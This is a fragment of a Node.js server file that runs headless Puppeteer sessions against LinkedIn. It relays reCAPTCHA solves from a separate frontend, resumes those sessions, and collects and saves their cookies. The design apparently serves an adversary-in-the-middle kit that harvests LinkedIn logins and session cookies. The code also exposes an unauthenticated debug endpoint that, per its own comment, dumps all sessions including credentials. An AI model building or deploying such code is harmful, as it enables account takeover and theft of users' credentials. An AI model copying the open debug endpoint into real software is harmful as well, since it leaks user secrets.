      await browser.close();
      delete sessions[sessionId];
      console.log(`Browser closed and session ${sessionId} cleaned up`);
    } catch (closeError) {
      console.error("Error closing browser:", closeError);
    }
  } catch (error) {
    console.error("Error in collectAndSaveCookies:", error);
  }
}

// Try to resume a Puppeteer session after an external reCAPTCHA solve
async function resumeSession(sessionId) {
  try {
    const session = sessions[sessionId];
    if (!session) {
      console.log(`resumeSession: session ${sessionId} not found`);
      return false;
    }

    const { page, browser } = session;

    console.log(`Attempting to resume session ${sessionId}`);
    // Retry loop with exponential backoff
    const maxAttempts = 4;
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        sendSseEvent(sessionId, 'resume_attempt', { attempt });

        // reload to refresh state
        try { await page.reload({ waitUntil: ['networkidle0', 'domcontentloaded'], timeout: 15000 }).catch(() => {}); } catch (e) {}

        // After reload, check whether the LinkedIn reCAPTCHA widget still exists.
        // If not present, assume human solved it and the session can be resumed.
        await delay(1500);
        const detection = await detectLinkedinRecaptcha(page);
        if (!detection || !detection.found) {
          console.log(`resumeSession: no reCAPTCHA detected for ${sessionId} (attempt ${attempt}), resuming`);
          sendSseEvent(sessionId, 'resumed', { success: true });
          return true;
        } else {
          console.log(`resumeSession: reCAPTCHA still present for ${sessionId} (attempt ${attempt}) at ${detection.frameUrl}`);
        }
      } catch (err) {
        console.error(`resumeSession attempt ${attempt} error:`, err);
      }

      // Save a debug artifact after failed attempt
      try {
        const debugDir = path.join(__dirname, 'debug');
        if (!fs.existsSync(debugDir)) fs.mkdirSync(debugDir, { recursive: true });
        const timestamp = Date.now();
        const screenshotPath = path.join(debugDir, `${sessionId}-resume-${attempt}-${timestamp}.png`);
        const htmlPath = path.join(debugDir, `${sessionId}-resume-${attempt}-${timestamp}.html`);
        try { await page.screenshot({ path: screenshotPath, fullPage: true }).catch(() => {}); } catch (e) {}
        try { const content = await page.content(); fs.writeFileSync(htmlPath, content, 'utf8'); } catch (e) {}
        console.log(`Saved resume debug artifacts for session ${sessionId}: ${screenshotPath}, ${htmlPath}`);
      } catch (e) {
        console.error('Failed saving resume debug artifacts:', e);
      }

      // Backoff before next attempt
      const backoffMs = Math.pow(2, attempt) * 1000; // 2s,4s,8s,16s
      await delay(backoffMs);
    }

    sendSseEvent(sessionId, 'resume_failed', { success: false });
    return false;
  } catch (err) {
    console.error('Error in resumeSession:', err);
    return false;
  }
}

// Helper function to safely execute Puppeteer actions
async function tryPuppeteerAction(action, errorMessage) {
  try {
    const result = await action();
    return result;
  } catch (error) {
    console.error(errorMessage, error);
    return null;
  }
}

// Server Initialization
// Manual reCAPTCHA verification endpoint for frontend relay
app.post('/api/recaptcha/manual-verify', async (req, res) => {
  const { sessionId, token } = req.body || {};
  if (!sessionId || !token) {
    return res.status(400).json({ success: false, error: 'Missing sessionId or token' });
  }
  try {
    const secret = process.env.LINKEDIN_RECAPTCHA_SECRET_KEY || process.env.RECAPTCHA_SECRET_KEY;
    if (!secret) {
      return res.status(500).json({ success: false, error: 'server-missing-secret' });
    }
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['x-real-ip'] || req.connection.remoteAddress;
    const verificationResult = await linkedInRecaptcha.verifyRecaptchaToken(token, secret, clientIp);
    if (verificationResult && verificationResult.success) {
      if (sessions[sessionId]) {
        sessions[sessionId].recaptchaPassed = true;
        sessions[sessionId].recaptchaVerifiedAt = new Date().toISOString();
      }
      req.session.recaptchaVerified = true;
      sendSseEvent(sessionId, 'recaptcha_verified', {
        success: true,
        timestamp: new Date().toISOString(),
        source: 'manual-verify',
        action: 'manual_verification',
        message: 'Manual reCAPTCHA verified. Proceeding.'
      });
      sendSseEvent(sessionId, 'navigate', {
        target: 'next-verification-step',
        message: 'Navigate to next verification step.'
      });
      setImmediate(async () => {
        try { await resumeSession(sessionId); } catch (e) {}
      });
      return res.json({ success: true, message: 'Manual reCAPTCHA verification successful', sessionId });
    } else {
      return res.status(400).json({ success: false, error: 'verification-failed', 'error-codes': verificationResult.errorCodes, message: 'Manual reCAPTCHA verification failed' });
    }
  } catch (err) {
    return res.status(500).json({ success: false, error: 'verification-error', message: 'Server error during manual reCAPTCHA verification' });
  }
});

// TEMPORARY: Debug endpoint to view all in-memory sessions and their state
app.get('/api/debug/sessions', (req, res) => {
  // WARNING: Do not expose in production! This dumps all session info including credentials.
  res.json(sessions);
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
